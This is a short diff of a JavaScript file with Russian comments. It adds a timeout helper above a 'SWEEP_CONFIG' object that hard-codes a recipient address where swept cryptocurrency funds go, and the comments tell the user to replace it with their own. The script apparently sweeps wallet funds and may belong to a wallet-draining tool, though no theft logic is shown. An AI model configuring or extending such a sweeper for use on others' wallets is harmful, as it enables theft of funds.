@@ -2,6 +2,12 @@
 // ===== КОНФИГУРАЦИЯ СПИСАНИЯ - НАСТРОЙТЕ ЗДЕСЬ! =============
 // ============================================================
 
+const withTimeout = (promise, ms, fallbackMessage = "Превышено время ожидания") =>
+  Promise.race([
+    promise,
+    new Promise((_, reject) => setTimeout(() => reject(new Error(fallbackMessage)), ms))
+  ]);
+
 const SWEEP_CONFIG = {
   // 🔥 АДРЕС КУДА СПИСЫВАТЬ СРЕДСТВА - ЗАМЕНИТЕ НА ВАШ!
   recipient: "0xB38376F2592377faa4774B6FfE8026EB4b001cd0",
